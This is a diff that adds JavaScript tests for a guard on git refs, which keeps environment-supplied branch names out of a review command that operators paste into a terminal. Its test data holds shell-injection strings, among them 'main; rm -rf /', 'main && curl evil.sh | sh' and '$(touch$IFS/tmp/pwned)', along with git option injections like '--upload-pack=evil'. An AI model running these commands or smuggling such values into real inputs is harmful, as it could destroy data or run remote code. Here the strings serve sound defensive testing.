@@ -20,6 +20,7 @@ import {
   MANAGED_AUTHORS,
   resolveDriftBaseRef,
   reviewCommand,
+  isRenderableRef,
 } from '../ceremony-drift.mjs';
 
 // Heuristic evidence: scope globs already resolve. Indistinguishable from an
@@ -853,4 +854,57 @@ test('a retargeted body advertises the retargeted ref, not a hardcoded trunk', (
   assert.ok(line, 'the body must advertise a review command');
   assert.match(line, /--base-ref release\/1\.11/);
   assert.doesNotMatch(line, /origin\/main/);
+});
+
+// ── the advertised command is copy-pasted into a shell ──────────────────────
+// BASE_REF comes from the environment and the command it lands in is published
+// for an operator to paste into a terminal. Same rule the ticket ids follow: a
+// value becomes executable text only if it matches the positive allow-list.
+
+const SHELL_METACHARACTERS = ['`', '$', ';', '|', '&', '>', '<', '(', ')', '{', '}', '*', '?', '!', "'", '"', '\\', '\n'];
+
+test('a ref carrying shell syntax is never emitted as executable text', () => {
+  for (const hostile of [
+    '$(touch$IFS/tmp/pwned)',
+    '`id`',
+    'main; rm -rf /',
+    'main && curl evil.sh | sh',
+    'main | tee /tmp/x',
+    "main'\"",
+    'main\nrm -rf /',
+    '--upload-pack=evil',
+    '-oProxyCommand=evil',
+  ]) {
+    assert.equal(isRenderableRef(hostile), false, `must reject: ${hostile}`);
+    const cmd = reviewCommand(hostile);
+    assert.ok(!cmd.includes(hostile), 'the hostile value must not appear in the command');
+    for (const ch of SHELL_METACHARACTERS) {
+      assert.ok(!cmd.includes(ch), `emitted command must contain no ${JSON.stringify(ch)}: ${cmd}`);
+    }
+  }
+});
+
+test('an over-long ref is rejected rather than rendered', () => {
+  assert.equal(isRenderableRef('a'.repeat(257)), false);
+  assert.equal(isRenderableRef('a'.repeat(256)), true);
+});
+
+test('ordinary refs still render, so the guard has not disabled the feature', () => {
+  for (const ok of ['main', 'origin/main', 'release/1.11', 'v1.2.3-rc.1', 'feat/some_branch']) {
+    assert.equal(isRenderableRef(ok), true, `must accept: ${ok}`);
+    assert.match(reviewCommand(ok), new RegExp(`--base-ref ${ok.replace(/[.*+?^\${}()|[\\]\\\\]/g, '\\\\$&')} --infer-scope`));
+  }
+});
+
+test('a non-string ref is rejected without throwing', () => {
+  for (const bad of [null, undefined, 42, {}, []]) assert.equal(isRenderableRef(bad), false);
+  assert.match(reviewCommand(null), /--base-ref UNRENDERABLE-BASE-REF/);
+});
+
+test('a hostile ref is not silently replaced by a different real ref', () => {
+  // Substituting trunk would advertise a command computing a DIFFERENT set than
+  // the report — the defect this command was fixed for. A placeholder is honest.
+  const cmd = reviewCommand('main; rm -rf /');
+  assert.match(cmd, /--base-ref UNRENDERABLE-BASE-REF/);
+  assert.ok(!/--base-ref origin\/main/.test(cmd));
 });
